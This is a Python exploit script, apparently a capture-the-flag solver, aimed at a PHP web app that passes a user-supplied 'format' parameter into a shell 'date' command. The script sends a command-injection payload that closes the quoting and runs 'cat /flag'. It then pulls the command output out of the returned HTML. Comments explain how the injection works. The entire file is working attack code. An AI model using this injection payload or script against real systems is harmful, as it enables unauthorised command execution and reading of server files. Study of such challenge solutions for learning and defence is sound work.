#!/usr/bin/env python3
import sys
import requests


def exploit(target_ip, target_port):
    base_url = f"http://{target_ip}:{target_port}/"

    # The format is placed inside single quotes in "date '+<format>' 2>&1".
    # The leading "%Y'" closes the quote, ";cat /flag" runs as a new command,
    # and "#" comments out the rest of the original command.
    payload = {"format": "%Y';cat /flag;#"}

    print(f"[*] Sending exploit payload to {base_url}...")
    try:
        response = requests.get(base_url, params=payload, timeout=5)
        print(f"\n[+] Status Code: {response.status_code}")
        # exec() in PHP returns only the last output line, so the flag is
        # the value shown in the heading.
        for line in response.text.splitlines():
            if "jumbotron-heading" in line:
                print(f"[+] Response Output:\n{line.strip()}")
    except Exception as e:
        print(f"[-] Exploit failed: {e}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    exploit(sys.argv[1], int(sys.argv[2]))
